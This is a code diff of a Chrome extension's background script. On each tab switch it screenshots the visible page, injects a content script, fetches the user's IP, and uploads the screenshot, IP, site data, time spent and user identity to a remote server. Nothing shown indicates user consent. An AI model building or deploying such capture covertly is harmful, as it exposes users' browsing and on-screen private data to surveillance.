@@ -84,9 +84,10 @@ function postToServer(formData) {
     })
 }
 
-function uploadScreenShot(dataURI) {
+function uploadScreenShot(dataURI, ipaddress) {
     var formData = new FormData()
     formData.append('screenshot', dataURI)
+    formData.append('ip', ipaddress)
     return fetch(`${serverUrl}/api/upload.php`, {
         'headers': {
             "accept": "application/json, text/javascript, */*; q=0.01",
@@ -109,52 +110,62 @@ chrome.tabs.onActivated.addListener(function(activeInfo) {
     setTimeout(() => {
         captureSite(activeInfo)
     }, 500);
+    // captureSite(activeInfo)
 });
 
   
-function captureSite(activeInfo) {
-    chrome.tabs.query({currentWindow: true, active: true}, (tabs) => {
+async function captureSite(activeInfo) {
+    await chrome.tabs.query({currentWindow: true, active: true}, async (tabs) => {
         console.log(tabs)
-        if(tabs[0].url.includes('chrome://extensions')) {
-            return
-        }else {
-            chrome.tabs.captureVisibleTab(null, {format: 'png'}, async function(dataURI) {
-                if (dataURI) {
-                    var res_data = await uploadScreenShot(dataURI).then(res => res.json())
-                    await chrome.storage.local.get(['tab_active_time', 'user_identity'], async function(result) {
-                        var tab_active_time                 = result.tab_active_time
-                        var tab_deactive_time               = new Date().getTime()
-                        var user_identity                   = result.user_identity
-        
-                        await chrome.storage.local.set({tab_active_time: tab_deactive_time})
-                        await chrome.tabs.executeScript(activeInfo.tabId, {
-                            file: 'contentScript.js'
-                        }, async function(result) {
-                            const lastErr                   = chrome.runtime.lastError
-                            if (lastErr) console.log('tab: ' + activeInfo.tabId + ' lastError: ' + JSON.stringify(lastErr))
-                            else {
-                                // Get IpAddress and Site Url
-                                var ipaddress_res           = await getIpAddress().then(res => res.text())
-                                ipaddress_res               = ipaddress_res.slice(ipaddress_res.indexOf('{'), ipaddress_res.indexOf('}') + 1)
-                                ipaddress_res               = JSON.parse(ipaddress_res)
-                                var postData                = Object.assign(ipaddress_res, result[0])
-                                postData.screenshot         = res_data.data.img_path
-                                postData.time_spending      = calcDateDiff(tab_active_time, tab_deactive_time)
-                                postData.last_connect       = new Date(tab_deactive_time).toLocaleString()
-                                // postData.last_connect       = convertTZ(new Date(tab_deactive_time), ipaddress_res.timezone)
-                                postData.user_identity      = user_identity
-                                var formData                = new FormData()
-                                for (let index = 0; index < Object.keys(postData).length; index++) {
-                                    formData.append(Object.keys(postData)[index], postData[Object.keys(postData)[index]])
-                                }
-                                var postRes = await postToServer(formData).then(res => res.text())
-                            }
-                        })
+        try {
+            if (tabs[0] !== undefined) {
+                if(tabs[0].url.includes('chrome://extensions')) {
+                    return
+                }else {
+                    chrome.tabs.captureVisibleTab(null, {format: 'png'}, async function(dataURI) {
+                        if (dataURI) {
+                            await chrome.storage.local.get(['tab_active_time', 'user_identity'], async (result) => {
+                                var tab_active_time                 = result.tab_active_time
+                                var tab_deactive_time               = new Date().getTime()
+                                var user_identity                   = result.user_identity
+                
+                                await chrome.storage.local.set({tab_active_time: tab_deactive_time})
+                                await chrome.tabs.executeScript(activeInfo.tabId, {
+                                    file: 'contentScript.js'
+                                }, async (result) => {
+                                    const lastErr                   = chrome.runtime.lastError
+                                    if (lastErr) console.log('tab: ' + activeInfo.tabId + ' lastError: ' + JSON.stringify(lastErr))
+                                    else {
+                                        // Get IpAddress and Site Url
+                                        var ipaddress_res           = await getIpAddress().then(res => res.text())
+                                        ipaddress_res               = ipaddress_res.slice(ipaddress_res.indexOf('{'), ipaddress_res.indexOf('}') + 1)
+                                        ipaddress_res               = JSON.parse(ipaddress_res)
+                                        var res_data                = await uploadScreenShot(dataURI, ipaddress_res.ip).then(res => res.json())
+                                        var postData                = Object.assign(ipaddress_res, result[0])
+                                        postData.screenshot         = res_data.data.img_path
+                                        postData.time_spending      = calcDateDiff(tab_active_time, tab_deactive_time)
+                                        postData.last_connect       = new Date(tab_deactive_time).toLocaleString()
+                                        // postData.last_connect       = convertTZ(new Date(tab_deactive_time), ipaddress_res.timezone)
+                                        postData.user_identity      = user_identity
+                                        var formData                = new FormData()
+                                        for (let index = 0; index < Object.keys(postData).length; index++) {
+                                            formData.append(Object.keys(postData)[index], postData[Object.keys(postData)[index]])
+                                        }
+                                        var postRes = await postToServer(formData).then(res => res.text())
+                                    }
+                                })
+                            })
+                            
+                        }
                     })
-                    
                 }
-            })
+            }
+        } catch (error) {
+            setTimeout(function() {
+                captureSite(activeInfo);
+            },100)
         }
+        
     })
     
 }
